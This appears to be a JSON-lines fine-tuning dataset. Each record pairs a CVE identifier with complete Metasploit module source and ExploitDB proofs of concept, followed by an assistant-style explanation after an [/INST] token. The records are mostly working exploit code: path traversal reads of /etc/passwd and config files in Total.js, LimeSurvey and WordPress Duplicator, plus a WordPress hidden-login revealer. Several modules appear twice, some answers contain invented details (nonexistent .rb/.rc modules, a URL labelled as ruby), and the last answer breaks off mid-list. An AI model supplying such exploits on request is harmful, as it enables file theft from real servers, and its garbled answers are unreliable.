{"query": "CVE-2019-8903", "Answer": "METASPLOIT: ### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework### Check and exploit Total.js Directory Traversal (CVE-2019-8903)class MetasploitModule < Msf::Auxiliary  include Msf::Exploit::Remote::HttpClient  def initialize(info = {})    super(update_info(info,      'Name' => 'Total.js prior to 3.2.4 Directory Traversal',      'Description' => %q(        This module check and exploits a directory traversal vulnerability in Total.js prior to 3.2.4.        Here is a list of accepted extensions: flac, jpg, jpeg, png, gif, ico, js, css, txt, xml,        woff, woff2, otf, ttf, eot, svg, zip, rar, pdf, docx, xlsx, doc, xls, html, htm, appcache,        manifest, map, ogv, ogg, mp4, mp3, webp, webm, swf, package, json, md, m4v, jsx, heif, heic      ),      'Author' =>        [          'Riccardo Krauter', # Discovery          'Fabio Cogno'       # Metasploit module        ],      'License' => MSF_LICENSE,      'References' =>        [          ['CVE', '2019-8903'],          ['CWE', '22'],          ['URL', 'https://blog.totaljs.com/blogs/news/20190213-a-critical-security-fix/'],          ['URL', 'https://security.snyk.io/vuln/SNYK-JS-TOTALJS-173710']        ],      'Privileged' => false,      'DisclosureDate' => '2019-02-18',      'Actions' =>        [          ['CHECK', { 'Description' => 'Check if the target is vulnerable' }],          ['READ', { 'Description' => 'Attempt to print file content' }],          ['DOWNLOAD', { 'Description' => 'Attempt to download a file' }]        ],      'DefaultAction' => 'CHECK'))    register_options(      [        OptString.new('TARGETURI', [true, 'Path to Total.js App installation', '/']),        OptInt.new('DEPTH', [true, 'Traversal depth', 1]),        OptString.new('FILE', [true, 'File to obtain', 'databases/settings.json'])      ]    )  end  def check_ext    extensions = %w[      flac jpg jpeg png gif ico js css txt xml      woff woff2 otf ttf eot svg zip rar pdf      docx xlsx doc xls html htm appcache      manifest map ogv ogg mp4 mp3 webp webm      swf package json md m4v jsx heif heic    ]    ext = datastore['FILE'].split('.').last    unless extensions.include? ext      print_warning \"Extension #{ext} is not supported by the HTTP static route of the framework\"    end  end  def check    uri = normalize_uri(target_uri.path) + '%2e%2e%2fpackage.json'    res = send_request_cgi(      'method' => 'GET',      'uri' => uri    )    if res && res.code == 200      json = res.get_json_document      if json.empty? || !json['dependencies']['total.js']        return Exploit::CheckCode::Safe      else        print_status(\"Total.js version is: #{json['dependencies']['total.js']}\")        print_status(\"App name: #{json['name']}\")        print_status(\"App description: #{json['description']}\")        print_status(\"App version: #{json['version']}\")        return Exploit::CheckCode::Vulnerable      end    elsif res && res.headers['X-Powered-By'].to_s.downcase.include?('total.js')      print_status('Target appear to be vulnerable!')      print_status(\"X-Powered-By: #{res.headers['X-Powered-By']}\")      return Exploit::CheckCode::Detected    else      vprint_warning('No response')      return Exploit::CheckCode::Unknown    end  end  def read    check_ext    traverse = '%2e%2e%2f' * datastore['DEPTH']    uri = normalize_uri(target_uri.path) + traverse + datastore['FILE']    res = send_request_cgi(      'method' => 'GET',      'uri' => uri    )    unless res      fail_with(Failure::Unreachable, 'Connection failed')    end    if res.code != 200      print_error(\"Unable to read '#{datastore['FILE']}', possibly because:\")      print_error(\"\\t1. File does not exist.\")      print_error(\"\\t2. No permission.\")      return    end    print_status(\"Getting #{datastore['FILE']}...\")    print_line(res.body)  end  def download    check_ext    traverse = '%2e%2e%2f' * datastore['DEPTH']    uri = normalize_uri(target_uri.path) + traverse + datastore['FILE']    res = send_request_cgi(      'method' => 'GET',      'uri' => uri    )    unless res      fail_with(Failure::Unreachable, 'Connection failed')    end    if res.code != 200      print_error(\"Unable to read '#{datastore['FILE']}', possibly because:\")      print_error(\"\\t1. File does not exist.\")      print_error(\"\\t2. No permission.\")      return    end    fname = datastore['FILE'].split('/')[-1].chop    ctype = res.headers['Content-Type'].split(';')    loot = store_loot('lfi.data', ctype[0], rhost, res.body, fname)    print_good(\"File #{fname} downloaded to: #{loot}\")  end  def run    case action.name    when 'CHECK'      check    when 'READ'      read    when 'DOWNLOAD'      download    end  endend       Question: CVE-2019-8903[/INST] CVE-2019-8903 is a directory traversal vulnerability affecting Total.js prior to version 3.2.4. This vulnerability can allow an attacker to read sensitive files by manipulating the request URI.The Metasploit Module above checks and exploits this vulnerability by sending HTTP requests to the targeted server and attempting to read or download files using the specified extension. If the server responds with a 200 status code, the requested file is assumed to be accessible, and the contents are printed or saved accordingly.Here's a brief explanation of the code snippet:1. Initializes the MetasploitModule class and sets various properties, such as Name, Description, License, etc.2. Registers options for TargetURI, DEPTH, and FILE.3. Defines the check method, which performs the actual vulnerability check by constructing a specific URI and making an HTTP GET request.4. Defines the read and download methods, which attempt to read or download files respectively, using the specified DEPTH and FILE options.5. The run method determines which action should be taken based on the specified action name ('CHECK', 'READ', or 'DOWNLOAD').This code snippet showcases how the Metasploit Framework can be utilized to discover and exploit vulnerabilities like CVE-2019-8903."}
{"query": "CVE-2021-24917", "Answer": "METASPLOIT: ### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Auxiliary::Report  include Msf::Exploit::Remote::HTTP::Wordpress  include Msf::Auxiliary::Scanner  def initialize(info = {})    super(      update_info(        info,        'Name' => 'WordPress WPS Hide Login Login Page Revealer',        'Description' => %q{          This module exploits a bypass issue with WPS Hide Login version <= 1.9.  WPS Hide Login          is used to make a new secret path to the login page, however a 'GET' request to          '/wp-admin/options.php' with a referer will reveal the hidden path.        },        'References' => [          ['WPVDB', '15bb711a-7d70-4891-b7a2-c473e3e8b375'],          ['CVE', '2021-24917'],          ['URL', 'https://wordpress.org/support/topic/bypass-security-issue/']        ],        'Author' => [          'thalakus', # Vulnerability discovery          'h00die' # Metasploit module        ],        'Notes' => {          'Stability' => [CRASH_SAFE],          'Reliability' => [],          'SideEffects' => [IOC_IN_LOGS]        },        'DisclosureDate' => '2021-10-27',        'License' => MSF_LICENSE      )    )  end  def run_host(ip)    unless wordpress_and_online?      fail_with Failure::NotVulnerable, \"#{ip} - Server not online or not detected as wordpress\"    end    checkcode = check_plugin_version_from_readme('wps-hide-login', '1.9.1')    unless [Msf::Exploit::CheckCode::Vulnerable, Msf::Exploit::CheckCode::Appears, Msf::Exploit::CheckCode::Detected].include?(checkcode)      fail_with Failure::NotVulnerable, \"#{ip} - A vulnerable version of the 'WPS Hide Login' was not found\"    end    print_good(\"#{ip} - Vulnerable version of wps_hide_login detected\")    print_status(\"#{ip} - Determining login page\")    # curl --referer \"something\" -sIXGET http://<ip>/wp-admin/options.php    res = send_request_cgi({      'method' => 'GET',      'headers' => {        'Referer' => Rex::Text.rand_text_alphanumeric(rand(5..7))      },      'uri' => normalize_uri(target_uri.path, 'wp-admin', 'options.php')    })    fail_with Failure::Unreachable, \"#{ip} - Connection failed\" unless res    fail_with Failure::NotVulnerable, \"#{ip} - Connection failed. Didn't receive a HTTP 302 redirect to the secret login page\" if res.code != 302    if res.headers['Location']      print_good(\"Login page: #{res.headers['Location']}\")    else      print_error('No location header found')    end  endend### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Auxiliary::Report  include Msf::Exploit::Remote::HTTP::Wordpress  include Msf::Auxiliary::Scanner  def initialize(info = {})    super(      update_info(        info,        'Name' => 'WordPress WPS Hide Login Login Page Revealer',        'Description' => %q{          This module exploits a bypass issue with WPS Hide Login version <= 1.9.  WPS Hide Login          is used to make a new secret path to the login page, however a 'GET' request to          '/wp-admin/options.php' with a referer will reveal the hidden path.        },        'References' => [          ['WPVDB', '15bb711a-7d70-4891-b7a2-c473e3e8b375'],          ['CVE', '2021-24917'],          ['URL', 'https://wordpress.org/support/topic/bypass-security-issue/']        ],        'Author' => [          'thalakus', # Vulnerability discovery          'h00die' # Metasploit module        ],        'Notes' => {          'Stability' => [CRASH_SAFE],          'Reliability' => [],          'SideEffects' => [IOC_IN_LOGS]        },        'DisclosureDate' => '2021-10-27',        'License' => MSF_LICENSE      )    )  end  def run_host(ip)    unless wordpress_and_online?      fail_with Failure::NotVulnerable, \"#{ip} - Server not online or not detected as wordpress\"    end    checkcode = check_plugin_version_from_readme('wps-hide-login', '1.9.1')    unless [Msf::Exploit::CheckCode::Vulnerable, Msf::Exploit::CheckCode::Appears, Msf::Exploit::CheckCode::Detected].include?(checkcode)      fail_with Failure::NotVulnerable, \"#{ip} - A vulnerable version of the 'WPS Hide Login' was not found\"    end    print_good(\"#{ip} - Vulnerable version of wps_hide_login detected\")    print_status(\"#{ip} - Determining login page\")    # curl --referer \"something\" -sIXGET http://<ip>/wp-admin/options.php    res = send_request_cgi({      'method' => 'GET',      'headers' => {        'Referer' => Rex::Text.rand_text_alphanumeric(rand(5..7))      },      'uri' => normalize_uri(target_uri.path, 'wp-admin', 'options.php')    })    fail_with Failure::Unreachable, \"#{ip} - Connection failed\" unless res    fail_with Failure::NotVulnerable, \"#{ip} - Connection failed. Didn't receive a HTTP 302 redirect to the secret login page\" if res.code != 302    if res.headers['Location']      print_good(\"Login page: #{res.headers['Location']}\")    else      print_error('No location header found')    end  endend       Question: CVE-2021-24917[/INST] CVE-2021-24917 is a vulnerability affecting WordPress installations with the WPS Hide Login plugin. The vulnerability allows an attacker to reveal the hidden login page by making a GET request to \"/wp-admin/options.php\" with a specific Referer header. This issue was reported by thalakus and added to the Metasploit framework by h00die. The vulnerability affects versions of WPS Hide Login prior to 1.9.1. To exploit this vulnerability, an attacker could use tools such as Metasploit or Burp Suite to send the crafted request and obtain the login page URL. The impact of this vulnerability is considered medium, as it could allow unauthorized access to the WordPress admin panel. Organizations should ensure their WordPress instances are updated to the latest version to mitigate this risk."}
{"query": "CVE-2020-11455", "Answer": "METASPLOIT: ### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Exploit::Remote::HttpClient  include Msf::Auxiliary::Report  include Msf::Auxiliary::Scanner  def initialize(info = {})    super(      update_info(        info,        'Name' => 'LimeSurvey Zip Path Traversals',        'Description' => %q{          This module exploits an authenticated path traversal vulnerability found in LimeSurvey          versions between 4.0 and 4.1.11 with CVE-2020-11455 or <= 3.15.9 with CVE-2019-9960,          inclusive.          In CVE-2020-11455 the getZipFile function within the filemanager functionality          allows for arbitrary file download.  The file retrieved may be deleted after viewing,          which was confirmed in testing.          In CVE-2019-9960 the szip function within the downloadZip functionality allows          for arbitrary file download.          Verified against 4.1.11-200316, 3.15.0-181008, 3.9.0-180604, 3.6.0-180328,          3.0.0-171222, and 2.70.0-170921.        },        'License' => MSF_LICENSE,        'Author' => [          'h00die', # msf module          'Matthew Aberegg', # edb/discovery cve 2020          'Michael Burkey', # edb/discovery cve 2020          'Federico Fernandez', # cve 2019          'Alejandro Parodi' # credited in cve 2019 writeup        ],        'References' => [          # CVE-2020-11455          ['EDB', '48297'], # CVE-2020-11455          ['CVE', '2020-11455'],          ['URL', 'https://github.com/LimeSurvey/LimeSurvey/commit/daf50ebb16574badfb7ae0b8526ddc5871378f1b'],          # CVE-2019-9960          ['CVE', '2019-9960'],          ['URL', 'https://www.secsignal.org/en/news/cve-2019-9960-arbitrary-file-download-in-limesurvey/'],          ['URL', 'https://github.com/LimeSurvey/LimeSurvey/commit/1ed10d3c423187712b8f6a8cb2bc9d5cc3b2deb8']        ],        'DisclosureDate' => '2020-04-02',        'Notes' => {          'Stability' => [CRASH_SAFE],          'SideEffects' => [IOC_IN_LOGS],          'Reliability' => []        }      )    )    register_options(      [        OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 7 ]),        OptString.new('TARGETURI', [true, 'The base path to the LimeSurvey installation', '/']),        OptString.new('FILE', [true, 'The file to retrieve', '/etc/passwd']),        OptString.new('USERNAME', [true, 'LimeSurvey Username', 'admin']),        OptString.new('PASSWORD', [true, 'LimeSurvey Password', 'password'])      ]    )  end  def uri    target_uri.path  end  def cve_2020_11455(cookie, ip)    vprint_status('Attempting to retrieve file')    print_error 'This method will possibly delete the file retrieved!!!'    traversal = '../' * datastore['DEPTH']    res = send_request_cgi({      'method' => 'GET',      'uri' => normalize_uri(uri, 'index.php', 'admin', 'filemanager', 'sa', 'getZipFile'),      'cookie' => cookie,      'vars_get' => {        'path' => \"#{traversal}#{datastore['FILE']}\"      }    })    if res && res.code == 200 && !res.body.empty?      loot = store_loot('', 'text/plain', ip, res.body, datastore['FILE'], 'LimeSurvey Path Traversal')      print_good(\"File stored to: #{loot}\")    else      print_bad('File not found or server not vulnerable')    end  end  def cve_2019_9960_version_3(cookie, ip)    vprint_status('Attempting to retrieve file')    traversal = '../' * datastore['DEPTH']    res = send_request_cgi({      'method' => 'GET',      'uri' => normalize_uri(uri, 'index.php', 'admin', 'export', 'sa', 'downloadZip'),      'cookie' => cookie,      'vars_get' => {        'sZip' => \"#{traversal}#{datastore['FILE']}\"      }    })    if res && res.code == 200 && !res.body.empty?      loot = store_loot('', 'text/plain', ip, res.body, datastore['FILE'], 'LimeSurvey Path Traversal')      print_good(\"File stored to: #{loot}\")    else      print_bad('File not found or server not vulnerable')    end  end  # untested because I couldn't find when this applies.  It is pre 2.7 definitely, but unsure when.  # this URL scheme was noted in the secsignal write-up  def cve_2019_9960_pre25(cookie, ip)    vprint_status('Attempting to retrieve file')    traversal = '../' * datastore['DEPTH']    res = send_request_cgi({      'method' => 'GET',      'uri' => normalize_uri(uri, 'index.php'),      'cookie' => cookie,      'vars_get' => {        'sZip' => \"#{traversal}#{datastore['FILE']}\",        'r' => 'admin/export/sa/downloadZip'      }    })    if res && res.code == 200 && !res.body.empty?      loot = store_loot('', 'text/plain', ip, res.body, datastore['FILE'], 'LimeSurvey Path Traversal')      print_good(\"File stored to: #{loot}\")    else      print_bad('File not found or server not vulnerable')    end  end  def login    # get csrf    res = send_request_cgi({      'method' => 'GET',      'uri' => normalize_uri(uri, 'index.php', 'admin', 'authentication', 'sa', 'login')    })    cookie = res.get_cookies    fail_with(Failure::NoAccess, 'No response from server') unless res    # this regex is version 4+ compliant, will fail on earlier versions which aren't vulnerable anyways.    /\"csrfTokenName\":\"(?<csrf_name>\\w+)\"/i =~ res.body    /\"csrfToken\":\"(?<csrf_value>[\\w=-]+)\"/i =~ res.body    csrf_name = 'YII_CSRF_TOKEN' if csrf_name.blank? # default value    fail_with(Failure::NoAccess, 'Unable to get CSRF values, check URI and server parameters.') if csrf_value.blank?    vprint_status(\"CSRF: #{csrf_name} => #{csrf_value}\")    res = send_request_cgi({      'method' => 'POST',      'uri' => normalize_uri(uri, 'index.php', 'admin', 'authentication', 'sa', 'login'),      'cookie' => cookie,      'vars_post' => {        csrf_name => csrf_value,        'authMethod' => 'Authdb',        'user' => datastore['USERNAME'],        'password' => datastore['PASSWORD'],        'loginlang' => 'default',        'action' => 'login',        'width' => '100',        'login_submit' => 'login'      }    })    if res && res.code == 302 && res.headers['Location'].include?('login') # good login goes to location admin/index not admin/authentication/sa/login      fail_with(Failure::NoAccess, 'No response from server')    end    vprint_good('Login Successful')    res.get_cookies  end  def determine_version(cookie)    res = send_request_cgi({      'method' => 'GET',      'uri' => normalize_uri(uri, 'index.php', 'admin', 'index'),      'cookie' => cookie    })    fail_with(Failure::NoAccess, 'No response from server') unless res    /Version\\s+(?<version>\\d\\.\\d{1,2}\\.\\d{1,2})/ =~ res.body    return nil unless version    Rex::Version.new(version)  end  def run_host(ip)    cookie = login    version = determine_version cookie    if version.nil?      # try them all!!!      print_status('Unable to determine version, trying all exploits')      cve_2020_11455 cookie, ip      cve_2019_9960_3_15_9 cookie, ip      cve_2019_9960_pre3_15_9 cookie, ip    end    vprint_status \"Version Detected: #{version.version}\"    if version.between?(Rex::Version.new('4.0'), Rex::Version.new('4.1.11'))      cve_2020_11455 cookie, ip    elsif version.between?(Rex::Version.new('2.50.0'), Rex::Version.new('3.15.9'))      cve_2019_9960_version_3 cookie, ip    # 2.50 is when LimeSurvey started doing almost daily releases.  This version was    # picked arbitrarily as I can't seem to find a lower bounds on when this other    # method may be needed.    elsif version < Rex::Version.new('2.50.0')      cve_2019_9960_pre25 cookie, ip    else      print_bad \"No exploit for version #{version.version}\"    end  endend### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Exploit::Remote::HttpClient  include Msf::Auxiliary::Report  include Msf::Auxiliary::Scanner  def initialize(info = {})    super(      update_info(        info,        'Name' => 'LimeSurvey Zip Path Traversals',        'Description' => %q{          This module exploits an authenticated path traversal vulnerability found in LimeSurvey          versions between 4.0 and 4.1.11 with CVE-2020-11455 or <= 3.15.9 with CVE-2019-9960,          inclusive.          In CVE-2020-11455 the getZipFile function within the filemanager functionality          allows for arbitrary file download.  The file retrieved may be deleted after viewing,          which was confirmed in testing.          In CVE-2019-9960 the szip function within the downloadZip functionality allows          for arbitrary file download.          Verified against 4.1.11-200316, 3.15.0-181008, 3.9.0-180604, 3.6.0-180328,          3.0.0-171222, and 2.70.0-170921.        },        'License' => MSF_LICENSE,        'Author' => [          'h00die', # msf module          'Matthew Aberegg', # edb/discovery cve 2020          'Michael Burkey', # edb/discovery cve 2020          'Federico Fernandez', # cve 2019          'Alejandro Parodi' # credited in cve 2019 writeup        ],        'References' => [          # CVE-2020-11455          ['EDB', '48297'], # CVE-2020-11455          ['CVE', '2020-11455'],          ['URL', 'https://github.com/LimeSurvey/LimeSurvey/commit/daf50ebb16574badfb7ae0b8526ddc5871378f1b'],          # CVE-2019-9960          ['CVE', '2019-9960'],          ['URL', 'https://www.secsignal.org/en/news/cve-2019-9960-arbitrary-file-download-in-limesurvey/'],          ['URL', 'https://github.com/LimeSurvey/LimeSurvey/commit/1ed10d3c423187712b8f6a8cb2bc9d5cc3b2deb8']        ],        'DisclosureDate' => '2020-04-02',        'Notes' => {          'Stability' => [CRASH_SAFE],          'SideEffects' => [IOC_IN_LOGS],          'Reliability' => []        }      )    )    register_options(      [        OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 7 ]),        OptString.new('TARGETURI', [true, 'The base path to the LimeSurvey installation', '/']),        OptString.new('FILE', [true, 'The file to retrieve', '/etc/passwd']),        OptString.new('USERNAME', [true, 'LimeSurvey Username', 'admin']),        OptString.new('PASSWORD', [true, 'LimeSurvey Password', 'password'])      ]    )  end  def uri    target_uri.path  end  def cve_2020_11455(cookie, ip)    vprint_status('Attempting to retrieve file')    print_error 'This method will possibly delete the file retrieved!!!'    traversal = '../' * datastore['DEPTH']    res = send_request_cgi({      'method' => 'GET',      'uri' => normalize_uri(uri, 'index.php', 'admin', 'filemanager', 'sa', 'getZipFile'),      'cookie' => cookie,      'vars_get' => {        'path' => \"#{traversal}#{datastore['FILE']}\"      }    })    if res && res.code == 200 && !res.body.empty?      loot = store_loot('', 'text/plain', ip, res.body, datastore['FILE'], 'LimeSurvey Path Traversal')      print_good(\"File stored to: #{loot}\")    else      print_bad('File not found or server not vulnerable')    end  end  def cve_2019_9960_version_3(cookie, ip)    vprint_status('Attempting to retrieve file')    traversal = '../' * datastore['DEPTH']    res = send_request_cgi({      'method' => 'GET',      'uri' => normalize_uri(uri, 'index.php', 'admin', 'export', 'sa', 'downloadZip'),      'cookie' => cookie,      'vars_get' => {        'sZip' => \"#{traversal}#{datastore['FILE']}\"      }    })    if res && res.code == 200 && !res.body.empty?      loot = store_loot('', 'text/plain', ip, res.body, datastore['FILE'], 'LimeSurvey Path Traversal')      print_good(\"File stored to: #{loot}\")    else      print_bad('File not found or server not vulnerable')    end  end  # untested because I couldn't find when this applies.  It is pre 2.7 definitely, but unsure when.  # this URL scheme was noted in the secsignal write-up  def cve_2019_9960_pre25(cookie, ip)    vprint_status('Attempting to retrieve file')    traversal = '../' * datastore['DEPTH']    res = send_request_cgi({      'method' => 'GET',      'uri' => normalize_uri(uri, 'index.php'),      'cookie' => cookie,      'vars_get' => {        'sZip' => \"#{traversal}#{datastore['FILE']}\",        'r' => 'admin/export/sa/downloadZip'      }    })    if res && res.code == 200 && !res.body.empty?      loot = store_loot('', 'text/plain', ip, res.body, datastore['FILE'], 'LimeSurvey Path Traversal')      print_good(\"File stored to: #{loot}\")    else      print_bad('File not found or server not vulnerable')    end  end  def login    # get csrf    res = send_request_cgi({      'method' => 'GET',      'uri' => normalize_uri(uri, 'index.php', 'admin', 'authentication', 'sa', 'login')    })    cookie = res.get_cookies    fail_with(Failure::NoAccess, 'No response from server') unless res    # this regex is version 4+ compliant, will fail on earlier versions which aren't vulnerable anyways.    /\"csrfTokenName\":\"(?<csrf_name>\\w+)\"/i =~ res.body    /\"csrfToken\":\"(?<csrf_value>[\\w=-]+)\"/i =~ res.body    csrf_name = 'YII_CSRF_TOKEN' if csrf_name.blank? # default value    fail_with(Failure::NoAccess, 'Unable to get CSRF values, check URI and server parameters.') if csrf_value.blank?    vprint_status(\"CSRF: #{csrf_name} => #{csrf_value}\")    res = send_request_cgi({      'method' => 'POST',      'uri' => normalize_uri(uri, 'index.php', 'admin', 'authentication', 'sa', 'login'),      'cookie' => cookie,      'vars_post' => {        csrf_name => csrf_value,        'authMethod' => 'Authdb',        'user' => datastore['USERNAME'],        'password' => datastore['PASSWORD'],        'loginlang' => 'default',        'action' => 'login',        'width' => '100',        'login_submit' => 'login'      }    })    if res && res.code == 302 && res.headers['Location'].include?('login') # good login goes to location admin/index not admin/authentication/sa/login      fail_with(Failure::NoAccess, 'No response from server')    end    vprint_good('Login Successful')    res.get_cookies  end  def determine_version(cookie)    res = send_request_cgi({      'method' => 'GET',      'uri' => normalize_uri(uri, 'index.php', 'admin', 'index'),      'cookie' => cookie    })    fail_with(Failure::NoAccess, 'No response from server') unless res    /Version\\s+(?<version>\\d\\.\\d{1,2}\\.\\d{1,2})/ =~ res.body    return nil unless version    Rex::Version.new(version)  end  def run_host(ip)    cookie = login    version = determine_version cookie    if version.nil?      # try them all!!!      print_status('Unable to determine version, trying all exploits')      cve_2020_11455 cookie, ip      cve_2019_9960_3_15_9 cookie, ip      cve_2019_9960_pre3_15_9 cookie, ip    end    vprint_status \"Version Detected: #{version.version}\"    if version.between?(Rex::Version.new('4.0'), Rex::Version.new('4.1.11'))      cve_2020_11455 cookie, ip    elsif version.between?(Rex::Version.new('2.50.0'), Rex::Version.new('3.15.9'))      cve_2019_9960_version_3 cookie, ip    # 2.50 is when LimeSurvey started doing almost daily releases.  This version was    # picked arbitrarily as I can't seem to find a lower bounds on when this other    # method may be needed.    elsif version < Rex::Version.new('2.50.0')      cve_2019_9960_pre25 cookie, ip    else      print_bad \"No exploit for version #{version.version}\"    end  endendEXPLOIT: # Exploit Title: LimeSurvey 4.1.11 - 'File Manager' Path Traversal# Date: 2020-04-02# Exploit Author: Matthew Aberegg, Michael Burkey# Vendor Homepage: https://www.limesurvey.org# Version: LimeSurvey 4.1.11+200316# Tested on: Ubuntu 18.04.4# CVE : CVE-2020-11455# Vulnerability Details# Description : A path traversal vulnerability exists within the \"File Manager\" functionality of LimeSurvey# that allows an attacker to download arbitrary files.  The file manager functionality will also# delete the file after it is downloaded (if the web service account has permissions to do so),# allowing an attacker to cause a denial of service by specifying a critical LimeSurvey configuration file.Vulnerable Parameter : \"path\"# POChttps://TARGET/limesurvey/index.php/admin/filemanager/sa/getZipFile?path=/../../../../../../../etc/passwd       Question: CVE-2020-11455[/INST] CVE-2020-11455 is a vulnerability affecting LimeSurvey versions between 4.0 and 4.1.11. It is a path traversal vulnerability in the filemanager functionality of LimeSurvey, specifically in the getZipFile function. This vulnerability allows an attacker to download arbitrary files from the affected system. After the file is downloaded, the file manager functionality deletes the file, potentially causing a Denial of Service (DoS) if the web service account has permissions to delete critical LimeSurvey configuration files.To exploit this vulnerability, an attacker would craft a malicious request containing a specially crafted path parameter. For instance, the following URL demonstrates how an attacker might exploit this vulnerability to download the /etc/passwd file:```rubyhttps://TARGET/limesurvey/index.php/admin/filemanager/sa/getZipFile?path=/../../../../../../../etc/passwd```In order to mitigate this vulnerability, it is recommended to upgrade your LimeSurvey installation to a patched version. Additionally, implementing proper access controls and limiting user privileges can help prevent unauthorized access to sensitive files."}
{"query": "CVE-2020-11738", "Answer": "METASPLOIT: ### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Auxiliary::Report  include Msf::Exploit::Remote::HTTP::Wordpress  include Msf::Auxiliary::Scanner  def initialize(info = {})    super(      update_info(        info,        'Name' => 'WordPress Duplicator File Read Vulnerability',        'Description' => %q{          This module exploits an unauthenticated directory traversal vulnerability in WordPress plugin          'Duplicator' version 1.3.24-1.3.26, allowing arbitrary file read with the web server privileges.          This vulnerability was being actively exploited when it was discovered.        },        'References' => [          ['CVE', '2020-11738'],          ['WPVDB', '10078'],          ['URL', 'https://snapcreek.com/duplicator/docs/changelog']        ],        'Author' => [          'Ramuel Gall', # Vulnerability discovery          'Hoa Nguyen - SunCSR Team' # Metasploit module        ],        'DisclosureDate' => '2020-02-19',        'License' => MSF_LICENSE,        'Notes' => {          'Stability' => [CRASH_SAFE],          'SideEffects' => [IOC_IN_LOGS],          'Reliability' => []        }      )    )    register_options(      [        OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),        OptInt.new('DEPTH', [true, 'Traversal Depth (to reach the root folder)', 5])      ]    )  end  def check    check_plugin_version_from_readme('duplicator_download', '1.3.27', '1.3.24')  end  def run_host(ip)    traversal = '../' * datastore['DEPTH']    filename = datastore['FILEPATH']    filename = filename[1, filename.length] if filename =~ %r{^/}    res = send_request_cgi({      'method' => 'GET',      'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php'),      'vars_get' =>     {       'action' => 'duplicator_download',       'file' => \"#{traversal}#{filename}\"     }    })    fail_with Failure::Unreachable, 'Connection failed' unless res    fail_with Failure::NotVulnerable, 'Connection failed. Nothing was downloaded' if res.code != 200    fail_with Failure::NotVulnerable, 'Nothing was downloaded. Change the DEPTH parameter' if res.body.empty?    print_status('Downloading file...')    print_line(\"\#{res.body}\\")    fname = datastore['FILEPATH']    path = store_loot(      'duplicator.traversal',      'text/plain',      ip,      res.body,      fname    )    print_good(\"File saved in: #{path}\")  endend### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Auxiliary::Report  include Msf::Exploit::Remote::HTTP::Wordpress  include Msf::Auxiliary::Scanner  def initialize(info = {})    super(      update_info(        info,        'Name' => 'WordPress Duplicator File Read Vulnerability',        'Description' => %q{          This module exploits an unauthenticated directory traversal vulnerability in WordPress plugin          'Duplicator' version 1.3.24-1.3.26, allowing arbitrary file read with the web server privileges.          This vulnerability was being actively exploited when it was discovered.        },        'References' => [          ['CVE', '2020-11738'],          ['WPVDB', '10078'],          ['URL', 'https://snapcreek.com/duplicator/docs/changelog']        ],        'Author' => [          'Ramuel Gall', # Vulnerability discovery          'Hoa Nguyen - SunCSR Team' # Metasploit module        ],        'DisclosureDate' => '2020-02-19',        'License' => MSF_LICENSE,        'Notes' => {          'Stability' => [CRASH_SAFE],          'SideEffects' => [IOC_IN_LOGS],          'Reliability' => []        }      )    )    register_options(      [        OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),        OptInt.new('DEPTH', [true, 'Traversal Depth (to reach the root folder)', 5])      ]    )  end  def check    check_plugin_version_from_readme('duplicator_download', '1.3.27', '1.3.24')  end  def run_host(ip)    traversal = '../' * datastore['DEPTH']    filename = datastore['FILEPATH']    filename = filename[1, filename.length] if filename =~ %r{^/}    res = send_request_cgi({      'method' => 'GET',      'uri' => normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php'),      'vars_get' =>     {       'action' => 'duplicator_download',       'file' => \"#{traversal}#{filename}\"     }    })    fail_with Failure::Unreachable, 'Connection failed' unless res    fail_with Failure::NotVulnerable, 'Connection failed. Nothing was downloaded' if res.code != 200    fail_with Failure::NotVulnerable, 'Nothing was downloaded. Change the DEPTH parameter' if res.body.empty?    print_status('Downloading file...')    print_line(\"\#{res.body}\\")    fname = datastore['FILEPATH']    path = store_loot(      'duplicator.traversal',      'text/plain',      ip,      res.body,      fname    )    print_good(\"File saved in: #{path}\")  endendEXPLOIT: # Exploit Title: Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read# Date: October 16, 2021# Exploit Author: nam3lum# Vendor Homepage: https://wordpress.org/plugins/duplicator/# Software Link: https://downloads.wordpress.org/plugin/duplicator.1.3.26.zip]# Version: 1.3.26# Tested on: Ubuntu 16.04# CVE : CVE-2020-11738import requests as reimport sysif len(sys.argv) != 3:        print(\"Exploit made by nam3lum.\")        print(\"Usage: CVE-2020-11738.py http://192.168.168.167 /etc/passwd\")        exit()arg = sys.argv[1]file = sys.argv[2]URL = arg + \"/wp-admin/admin-ajax.php?action=duplicator_download&file=../../../../../../../../..\" + fileoutput = re.get(url = URL)print(output.text)       Question: CVE-2020-11738[/INST] CVE-2020-11738 is an unauthenticated directory traversal vulnerability affecting the WordPress plugin 'Duplicator' versions 1.3.24-1.3.26. This vulnerability allows attackers to read arbitrary files with the web server privileges.To exploit this vulnerability, an attacker would make a GET request to the admin-ajax.php endpoint of a target WordPress installation with a carefully crafted file argument. By manipulating the file path using directory traversal techniques, the attacker can force the plugin to read a file located outside of the intended directory.For instance, an attacker might construct a malicious request like this:```rubyhttp://example.com/wp-admin/admin-ajax.php?action=duplicator_download&file=../../../../../etc/passwd```This request would instruct the plugin to download the contents of the /etc/passwd file, granting the attacker access to sensitive information stored within the targeted system.Metasploit provides two auxiliary modules (CVE-2020-11738.rb and CVE-2020-11738.rc) that allow users to detect and exploit this vulnerability respectively. These modules require Metasploit Framework to function properly.Here's a brief overview of each module:1. 